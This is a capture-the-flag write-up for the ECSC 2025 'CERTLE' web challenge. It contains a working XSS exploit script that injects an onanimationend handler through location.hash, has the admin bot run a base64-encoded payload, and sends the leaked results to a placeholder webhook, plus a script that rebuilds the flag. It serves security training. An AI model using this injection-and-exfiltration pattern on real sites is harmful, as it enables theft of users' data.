# CERTLE

> STOP DOING CERTLE. MILIONS OF WORK-HOURS SPENT YET NO REAL-WORLD BENEFITS FOUND.
>
> [https://certle.ecsc25.hack.cert.pl/](https://certle.ecsc25.hack.cert.pl/)

## Solution
After analysing the backend and frontend source (links can be found in the HTML code), it seems that the frontend sets attributes on the ~~WORD~~CERTLE cell nodes to values decoded from `location.hash`. Combined with keyframes defined in the stylesheet, t's possible to abuse this behaviour to trigger arbitrary JavaScript code execution by setting a `onanimationend` attribute and a `style` attribute that defines an `animation` property. After that, the flag can be leaked from the answer bot by creating a WebSocket connection that checks all possible characters of the alphabet with the backend server and forwards the answers to a webhook:

```py
from base64 import b64encode
import requests
import time

print('Check: ', requests.get('https://certle.ecsc25.hack.cert.pl'))

loc_template = '''[{"letter":"b","attributes":{"onanimationend":"eval(atob('%s'));","dummy": "AAAA", "class":"cell font-monoscape green", "style": "animation: red 0.1s 1"}},{"letter":"o","attributes":{"class":"cell font-monospace green"}},{"letter":"r","attributes":{"class":"cell font-monospace green"}},{"letter":"a","attributes":{"class":"cell font-monospace green"}},{"letter":"t","attributes":{"class":"cell font-monospace green"}},{"letter":"e","attributes":{"class":"cell font-monospace green"}}]'''

code_template = '''
(function f() {
    let ws = new WebSocket("wss://certle.ecsc25.hack.cert.pl/ws");
    let alphabet = "abcdefghijklmnopqrstuvwxyz_{}0123456789"
    let idx = 0;

    function snd(ans) {
        if (ws.readyState != 1) {
            setTimeout(() => snd(ans), 5);
        } else {
            ws.send(JSON.stringify({ answer: ans }));
        }
    }

    ws.onmessage = function(event) {
        const result = event.data;
        var img = new Image(); img.src = `YOUR_WEBHOOK_LINK?char=${alphabet[idx]}&data=${result}`; document.body.appendChild(img);
        setTimeout(() => snd(alphabet[++idx].repeat(100)), 5);
    };

    snd(alphabet[idx].repeat(100));
})()
'''

code = code_template
loc = loc_template % b64encode(code.encode()).decode()
resp = requests.post('https://certle.ecsc25.hack.cert.pl/report', json={'url': 'https://certle.ecsc25.hack.cert.pl#' + b64encode(loc.encode()).decode()})
print(resp)
```

The flag can be recovered by saving the webhook data as a JSON document with keys being the `char`s and values being the `data` and running the following script:

```py
import json

with open('results.json', 'rt') as f:
    results = json.load(f)

flag = list(b'?' * len(results['a']))

for k, v in results.items():
    for i, c in enumerate(v):
        if c == 'green':
            flag[i] = ord(k)

print(bytes(flag).decode())
```

This outputs `ecsc25{crane?is?my?goto?word?how?about?you?}`. The characters that weren't found are easily guessed.

## Flag
`ecsc25{crane-is-my-goto-word-how-about-you?}`
